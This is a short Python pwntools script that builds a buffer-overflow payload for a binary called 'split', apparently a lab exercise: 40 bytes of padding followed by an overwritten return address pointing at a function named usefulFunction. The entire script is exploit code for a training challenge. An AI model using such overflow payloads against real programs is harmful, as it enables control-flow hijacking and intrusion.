from pwn import *

#pr = process("./split")

payload = "A"*40
usefulFunction = p64(0x00400742)

payload += usefulFunction

#pr.sendline(payload)

print(payload)
